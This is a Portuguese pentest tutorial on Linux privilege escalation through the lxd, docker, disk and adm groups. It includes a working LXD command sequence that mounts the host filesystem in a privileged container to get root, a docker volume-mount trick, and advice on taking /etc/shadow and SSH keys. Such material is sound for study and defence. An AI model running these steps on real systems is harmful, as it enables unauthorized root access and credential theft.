# Grupos Privilegiados

## LXC / LXD

LXD é semelhante ao Docker e é o gerenciador de containers da Ubuntu. Em muitas instalações, usuários podem acabar no grupo `lxd`. A associação a esse grupo pode permitir escalada de privilégios ao criar um container privilegiado e montar o sistema de arquivos do host em `/mnt/root`.

Primeiro, confirme a associação ao grupo:

```bash
devops@NIX02:~$ id
```

```text
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Descompacte a imagem Alpine:

```bash
devops@NIX02:~$ unzip alpine.zip
```

```text
Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz
inflating: 64-bit Alpine/alpine.tar.gz.root
cd 64-bit\ Alpine/
```

Inicie o processo de configuração do LXD (usando os padrões):

```bash
devops@NIX02:~$ lxd init
```

```text
Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Importe a imagem local:

```bash
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

```text
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Inicie um container privilegiado com `security.privileged=true` (sem mapeamento de UID, fazendo root no container equivaler a root no host):

```bash
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
```

```text
Creating r00t
```

Monte o sistema de arquivos do host:

```bash
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

```text
Device mydev added to r00t
```

Por fim, execute shell dentro do container. Agora é possível navegar no filesystem do host como root (por exemplo, `cd /mnt/root/root`) e acessar arquivos sensíveis como `/etc/shadow` e chaves SSH.

```bash
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
```

```text
~ # id
uid=0(root) gid=0(root)
~ #
```

## Docker

Colocar um usuário no grupo `docker` é, na prática, equivalente a acesso de root ao sistema de arquivos, sem senha. Membros do grupo conseguem criar containers novos.

Exemplo:

```bash
docker run -v /root:/mnt -it ubuntu
```

Esse comando cria um container com o diretório `/root` do host montado como volume. A partir daí, pode-se ler ou adicionar chaves SSH do root. O mesmo vale para outros diretórios, como `/etc`, permitindo obter conteúdo de `/etc/shadow` para cracking offline ou adicionar usuário privilegiado.

## Disk

Usuários no grupo `disk` têm acesso total a dispositivos em `/dev` (ex.: `/dev/sda1`, normalmente o dispositivo principal do sistema). Um atacante com esse acesso pode usar ferramentas como `debugfs` para acessar todo o sistema de arquivos com nível de privilégio muito alto.

Assim como no caso do Docker, isso pode ser usado para extrair chaves SSH, credenciais ou adicionar usuários.

## ADM

Membros do grupo `adm` conseguem ler logs em `/var/log`. Isso não concede root diretamente, mas pode expor dados sensíveis, ações de usuários e tarefas agendadas.

```bash
secaudit@NIX02:~$ id
```

```text
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

